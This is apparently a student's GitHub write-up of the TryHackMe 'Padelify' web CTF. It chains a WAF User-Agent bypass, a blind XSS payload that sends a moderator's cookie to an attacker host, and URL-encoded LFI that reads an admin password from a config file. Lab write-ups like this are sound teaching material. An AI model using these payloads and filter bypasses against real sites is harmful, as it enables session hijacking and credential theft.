# Padelify-Writeup
TryHackMe Padelify CTF completed using enumeration, role manipulation, and privilege escalation.
# 🏓 Padelify — TryHackMe CTF Writeup  
**Difficulty:** Medium  
**Skills:** WAF Evas<img width="900" height="900" alt="Padelify" src="https://github.com/user-attachments/assets/285e8cf0-f8ad-4e78-bea0-6867df6f4bb0" />
ion · Blind XSS · LFI · Session Hijacking · Web Enumeration
![Uploading Padelify.png…]()

---

## 📌 Table of Contents
- [Overview](#overview)
- [Recon & WAF Bypass](#recon--waf-bypass)
- [Blind XSS → Moderator Takeover](#blind-xss--moderator-takeover)
- [LFI Exploitation → Admin Credentials](#lfi-exploitation--admin-credentials)
- [Final Access — Admin Panel](#final-access--admin-panel)
- [Tools Used](#tools-used)
- [Screenshot Placeholders](#screenshot-placeholders)
- [Author](#author)

---

## 📝 Overview
**Padelify** is a medium‑difficulty web challenge involving layered WAF defenses combined with classic vulnerabilities:

- Web Application Firewall (Signature‑Based)
- Blind Cross‑Site Scripting (XSS)
- Local File Inclusion (LFI)
- Cookie Exfiltration & Session Hijacking

The attack path went from **Unauthenticated → Moderator → Admin** using chained exploits.

---

## 🔍 Recon & WAF Bypass

### 🔸 Port Scan
Only two ports were open:

- **22/tcp (SSH)**
- **80/tcp (HTTP)**

### 🔸 Directory Bruteforce Blocked
Initial enumeration using *gobuster* was blocked:

- **403 Forbidden**
- WAF flagged the default `gobuster/3.8` User‑Agent string.

### 🔸 WAF Evasion
By spoofing a legitimate browser User‑Agent, the WAF ignored the requests.

```bash
gobuster dir -u http://<TARGET_IP>/ \
    -w /usr/share/wordlists/dirb/common.txt \
    -a "Mozilla/5.0"

🔸 Discovered Directories

/config

/logs

/index.php — registration form

🧨 Blind XSS → Moderator Takeover

The registration form is reviewed by a moderator, creating a perfect Blind XSS scenario.

🔸 Problem

WAF blocked common XSS keywords, including:

alert

document.cookie

<script> patterns

🔸 Solution: Bypass via String Concatenation

We used a payload that avoided the word cookie using concatenation.

🔸 Final Payload
<script>
    var i = new Image();
    i.src = "http://<ATTACKER_IP>:9001/?c=" + document["coo" + "kie"];
</script>

🔸 Listener
python3 -m http.server 9001


When the moderator viewed the entry, the session cookie was captured.

🎉 Moderator Flag Obtained
THM{REDUCTED}

📂 LFI Exploitation → Admin Credentials

With moderator access, the page /live.php?page= showed signs of LFI.

🔸 Direct paths blocked by WAF:
/etc/passwd
/config/app.conf

🔸 URL‑encoded Bypass

Encoding slashes (/ → %2F) bypassed filtering:

http://<TARGET_IP>/live.php?page=%2Fconfig%2Fapp.conf


This successfully revealed:

admin_info: admin:bL}8,S9W1o44

🔐 Final Access — Admin Panel

Logout as moderator and log in with the leaked credentials:

Username: admin
Password: bL}8,S9W1o44


Upon login, the final admin flag is displayed.

🎉 Admin Flag Obtained
THM{REDACTED_ADMIN_FLAG}

🛠 Tools Used
Tool	Purpose
nmap	Port scanning
gobuster	Directory Enumeration
Python HTTP Server	Cookie exfil listener
Burp Suite	Interception & testing payloads
Browser DevTools	Cookie replacement
🖼 Screenshot Placeholders

Replace with real screenshots once you upload them.

![WAF Block Screenshot](images/waf_block.png)
![Blind XSS Injection](images/xss_payload.png)
![Cookie Capture](images/cookie_capture.png)
![LFI Output](images/lfi_output.png)
![Admin Panel](images/admin_panel.png)

👤 Author

Sagar Ali
Cybersecurity Student · Web Exploitation · CTF Player
GitHub: your‑github‑username
